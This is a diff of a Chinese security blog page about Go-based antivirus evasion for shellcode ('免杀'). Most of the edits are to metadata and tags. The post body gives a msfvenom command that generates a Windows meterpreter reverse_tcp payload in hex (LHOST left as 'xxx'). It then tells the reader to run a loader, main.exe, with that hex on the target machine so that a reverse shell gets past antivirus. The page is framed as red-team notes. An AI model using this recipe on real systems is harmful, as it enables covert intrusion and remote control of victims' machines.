@@ -3,7 +3,7 @@
     <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>[Go免杀] shellcode 分离免杀-2 | rebootORZ</title>
-<link rel="shortcut icon" href="https://rebootorz.github.io/favicon.ico?v=1612850381178">
+<link rel="shortcut icon" href="https://rebootorz.github.io/favicon.ico?v=1612855925065">
 <link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
 <link rel="stylesheet" href="https://rebootorz.github.io/styles/main.css">
 <link rel="alternate" type="application/atom+xml" title="[Go免杀] shellcode 分离免杀-2 | rebootORZ - Atom Feed" href="https://rebootorz.github.io/atom.xml">
@@ -12,9 +12,10 @@
 
 
     <meta name="description" content="项目地址：https://github.com/brimstone/go-shellcode
+**注：**这个项目只支持msf的hex shellcode
 使用MSF生成hex shell code：
-msfvenom -p windows/x64/meterpreter/reverse_tcp  L..." />
-    <meta name="keywords" content="红队" />
+msfvenom -p windows..." />
+    <meta name="keywords" content="免杀,红队" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
     <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
   </head>
@@ -23,7 +24,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp  L..." />
       <div class="main-content">
         <div class="site-header">
   <a href="https://rebootorz.github.io">
-  <img class="avatar" src="https://rebootorz.github.io/images/avatar.png?v=1612850381178" alt="">
+  <img class="avatar" src="https://rebootorz.github.io/images/avatar.png?v=1612855925065" alt="">
   </a>
   <h1 class="site-title">
     rebootORZ
@@ -92,6 +93,10 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp  L..." />
                 1 min read
               </span>
               
+                <a href="https://rebootorz.github.io/tag/1xemCsPBb/" class="post-tag">
+                  # 免杀
+                </a>
+              
                 <a href="https://rebootorz.github.io/tag/BjedM9kLx/" class="post-tag">
                   # 红队
                 </a>
@@ -100,8 +105,9 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp  L..." />
             
             <div class="post-content-wrapper">
               <div class="post-content">
-                <p>项目地址：https://github.com/brimstone/go-shellcode</p>
-<p>使用MSF生成hex shell code：<br>
+                <p>项目地址：https://github.com/brimstone/go-shellcode<br>
+**注：**这个项目只支持msf的hex shellcode<br>
+使用MSF生成hex shell code：<br>
 msfvenom -p windows/x64/meterpreter/reverse_tcp  LHOST=xxx LPORT=4444 -f hex<br>
 在目标机器执行：<br>
 main.exe  hex代码</p>
